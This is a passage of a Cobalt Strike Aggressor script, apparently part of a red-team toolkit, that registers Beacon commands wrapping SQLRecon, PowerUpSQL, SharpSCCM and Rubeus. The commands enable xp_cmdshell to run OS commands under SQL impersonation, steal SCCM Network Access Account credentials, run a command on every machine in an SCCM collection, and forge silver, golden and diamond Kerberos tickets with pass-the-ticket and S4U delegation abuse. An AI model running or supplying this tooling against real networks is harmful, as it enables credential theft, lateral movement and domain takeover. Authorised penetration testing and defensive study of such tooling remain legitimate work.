    $cb1_args = $args . " /m:ixpcmd /c:\"" . $command . "\"";

    bexecute_assembly($1, $SQLRECON_PATH, $cb1_args, $null, lambda({ mssql_irunoscmd_cb2 ($1, $2, $3, $args); }));
}
alias mssql_irunoscmd {
    $size = size(@_);

    $args = "";
    if ($size == 4)
    {
        # [instance] [impersonating account] [command]
        $instance   = @_[1];
        $impaccount = @_[2];
        $command    = @_[3];

        $args = "/a:wintoken"
        . " /h:" . $instance
        . " /i:" . $impaccount;
        println("mssql_impersonatecommand - args = " . $args);

    }
    else if ($size == 6)
    {
        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [command]
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $command    = @_[6];

        $args = "/a:windomain"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:" . $impaccount;
        println("mssql_irunoscmd - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:ienablexp", $null, lambda({ mssql_irunoscmd_cb1 ($1, $2, $3, $args, $command); }));
}
beacon_command_register(
    "mssql_irunoscmd",
    "Use SQLRecon to run impersionated OS command against an instance",
    "Use SQLRecon to run impersionated OS command against an instance
This command will enable XPCMD, run the command, then disable it.

Usage:\n"
    . "mssql_irunoscmd [instance] [impersonating account] [module]\n"
    . "mssql_irunoscmd [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
);

## LINK ABUSE METHODS
alias mssql_checklinks {
    $size       = size(@_);
    $instance   = $2;
    $args       = join(" ", sublist(@_, 2, $size));
    $command    = "Get-SQLServerLinkCrawl -Instance \"" . $instance . "\" " . $args;

    bpowerpick($1, $command);
}
beacon_command_register(
    "mssql_checklinks",
    "Use PowerUpSQL to run query to check for links",
    "Usage:\n"
    . "mssql_checklinks [instance] (PowerUpSQL Additional Args)\n"
);

#SCCM ENUMRATION AND ATTACKS
##Enumeration
sub sccm_getinfo_cb {
    blog($1, $2);
}
alias sccm_getinfo{
    $size = size(@_);
    if ($size != 2) {
        berror($1, "Invalid Parameters.");
        return;
    } else {
        $args = "get site-info -d " . $2 . " --no-banner";
        bexecute_assembly($1, $SHARPSCCM_PATH, $args, $null, &sccm_getinfo_cb);
        bexecute_assembly($1, $SHARPSCCM_PATH, "get collections --no-banner", $null, &sccm_getinfo_cb);
    }
}
beacon_command_register(
    "sccm_getinfo",
    "sccm_getinfo",
    "Use SharpSCCM to get SCCM site info\n\n"
    . "Usage:\n"
    . "sccm_getinfo [domain]"
)

##Get Network Access Account Creds
alias sccm_getnaacreds {
    if(-isadmin $1){
        $args = "local naa -m wmi --no-banner";
        bexecute_assembly($1, $SHARPSCCM_PATH, $args);
    }
    else
    {
        berror($1, "Must be run as an admin user!");
        return;
    }
}
beacon_command_register(
    "sccm_getnaacreds",
    "Get SCCM NAA Creds",
    "Get SCCM NAA Creds using SharpSCCM\n"
    . "Requirements:\n"
    . "  Administrator Access\n"
    . "  Not use SMB Beacon"
)

## MASS LATERAL MOVEMENT!
alias sccm_massLateralMovement {
    $size    = size(@_);
    $beacon  = $1;
    $colname = $2;
    $command = join(" ", sublist(@_, 2, $size));

    $args = "exec"
    . " -n " . $colname
    . " -p \"" . $command . "\""
    . " -s --no-banner";

    bexecute_assembly($beacon, $SHARPSCCM_PATH, $args);
}
beacon_command_register(
    "sccm_massLateralMovement",
    "Specify command to run against all machines in a collection",
    "Specify command to run against all machines in a collection\n\n"
    ."Usages: sccm_massLateralMovement [CollectionName] [Command]"
)

#DOMAIN TAKEOVER ATTACKS
## SILVER TICKETS
alias kerberos_silverticket {
    $size = size(@_);
    if ($size == 6) {
        $user    = @_[1];
        $domain  = @_[2];
        $sid     = @_[3];
        $hash    = @_[4];
        $service = @_[5];

        $parameters = "silver"
        . " /user:" . $user
        . " /domain:" . $domain
        . " /sid:" . $sid
        . " /" . $hash
        . " /service:" . $service
        . " /nowrap"
    } else {
        berror($1, "Invalid Parameters");
        return;
    }
    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_silverticket",
    "Request a silver ticket",
    "Use Rubeus to request a silver TGS\n\n"
    . "Usage:\n"
    . "kerberos_silverticket [user] [domain fqdn] [Domain SID] [hashType:hash] [service]\n\n"
    . "hashType = [des|rc4|aes128|aes256]"
    . "Example service: cifs/wkstn1.domain.local\n"
    . "See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
)

alias kerberos_createnetonly {
    $size = size(@_);
    if ($size == 4) {
        $program = @_[1];
        $domain  = @_[2];
        $user    = @_[3];
        $pass    = rand_alphanum(8);

        $parameters = "createnetonly"
        . " /program:" . $program
        . " /domain:" . $domain
        . " /username:" . $user
        . " /password:" . $pass;

        bexecute_assembly($1, $RUBEUS_PATH, $parameters)
    } else if ($size == 5) {
        $program = @_[1];
        $domain  = @_[2];
        $user    = @_[3];
        $ticket  = @_[4];
        $pass    = rand_alphanum(8);

        $parameters = "createnetonly"
        . " /program:" . $program
        . " /domain:" . $domain
        . " /username:" . $user
        . " /password:" . $pass
        . " /ticket:" . $ticket;

        bexecute_assembly($1, $RUBEUS_PATH, $parameters)
    } else {
        berror($1, "Invalid parameters!");
    }
}

beacon_command_register(
    "kerberos_createnetonly",
    "Use Rebeus to create a net process",
    "Use Rebeus to create a net process\n\n"
    . "Usage:  kerberos_createnetonly [program] [domain] [username]\n"
    . "        kerberos_createnetonly [program] [domain] [username] [ticket]"
)

alias kerberos_ptt {
    $size = size(@_);
    if ($size == 3) {
        $luid    = @_[1];
        $ticket  = @_[2];

        if ($luid == 0) {
            $parameters = "ptt"
            . " /ticket:" . $ticket;
        } else {
            $parameters = "ptt"
            . " /luid:" . $luid
            . " /ticket:" . $ticket;
        }

        bexecute_assembly($1, $RUBEUS_PATH, $parameters)
    } else {
        berror($1, "Invalid parameters!");
    }
}
beacon_command_register(
    "kerberos_ptt",
    "Use Rubeus to pass-the-ticket to the LUID",
    "Use Rubeus to pass-the-ticket to the LUID\n\n"
    . "Usage: kerberos_ptt [LUID] [ticket]\n"
    . "Specify LUID 0 for current session"
)

alias kerberos_goldenticket {
    $size = size(@_);
    #[domain] [user] [Domain SID] [hashType:hash]
    if ($size == 5) {
        $domain  = @_[1];
        $user    = @_[2];
        $sid     = @_[3];
        $hash    = @_[4];

        $parameters = "golden"
        . " /user:" . $user
        . " /domain:" . $domain
        . " /sid:" . $sid
        . " /" . $hash
        . " /nowrap"
    } else {
        berror($1, "Invalid Parameters");
        return;
    }
    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_goldenticket",
    "Use Rubeus to forge a golden TGT",
    "Use Rubeus to forge a golden TGT\n\n"
    . "Usage: kerberos_goldenticket [domain] [user] [Domain SID] [hashType:hash]\n"
    . "hashType = [des|rc4|aes128|aes256]"
)

alias kerberos_diamondticket {
    $size = size(@_);
    #[ticket user] [ticket user RID] [groupscsv] [krbkey(aes256)]
    if ($size == 5) {
        $username = @_[1];
        $userrid  = @_[2];
        $groups   = @_[3];
        $hash     = @_[4];

        $parameters = "diamond /tgtdeleg"
        . " /ticketuser:" . $username
        . " /ticketuserid:" . $userrid
        . " /groups:" . $groups
        . " /krbkey:" . $hash
        . " /nowrap"
    } else {
        berror($1, "Invalid Parameters");
        return;
    }
    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_diamondticket",
    "Use Rubeus to forge a golden TGT",
    "Use Rubeus to forge a golden TGT\n\n"
    . "Usage:\n"
    . "kerberos_diamondticket [ticket user] [ticket user RID] [groupscsv] [krbkey(aes256)]\n"
)

alias kerberos_s4u {
    $size = size(@_);
    $parameters = "s4u /nowrap";
    if( $size == 5 ) {
        $impuser    = @_[1];
        $delspn     = @_[2];
        $user       = @_[3];
        $ticket     = @_[4];
        $parameters = $parameters
        . " /impersonateuser:" . $impuser
        . " /msdsspn:" . $delspn
        . " /user:" . $user
        . " /ticket:" . $ticket;
    } else if ( $size == 6 ) {
        $impuser    = @_[1];
        $delspn     = @_[2];
        $altspn     = @_[3];
        $user       = @_[4];
        $ticket     = @_[5];
        $parameters = $parameters
        . " /impersonateuser:" . $impuser
        . " /msdsspn:" . $delspn
        . " /altservice:" . $altspn
        . " /user:" . $user
        . " /ticket:" . $ticket;
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }

    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_s4u",
    "Use Rubeus to perform S4U delegation",
    "Use Rubeus to perform S4U delegation\n\n"
    . "Usage: kerberos_s4u [impersonated user] [delegatable spn] [ticket user] [ticket]\n"
    . "       kerberos_s4u [impersonated user] [delegatable spn] [alt spn] [ticket user] [ticket]\n\n"
    . "Examples:\n"
    . "[delegatable spn] - cifs/host.domain.tld\n"
    . "[alt spn] - ldap\n"
)

alias kerberos_s4uself {
    $size = size(@_);
    $parameters = "s4u /nowrap /self";
    if( $size == 5 ) {
        $impuser    = @_[1];
        $altspn     = @_[2];
        $user       = @_[3];
        $ticket     = @_[4];

        $parameters = $parameters
        . " /impersonateuser:" . $impuser
        . " /altservice:" . $altspn
        . " /user:" . $user
        . " /ticket:" . $ticket;
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }

    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_s4uself",
    "Use Rubeus to perform S4U2Self delegation",
    "Use Rubeus to perform S4U2Self delegation\n\n"
    . "Usage: kerberos_s4uself [impersonated user] [altservice spn] [ticket user] [ticket]\n\n"
    . "Examples:\n"
    . "[altservice spn] - cifs/host.domain.tld\n"
)
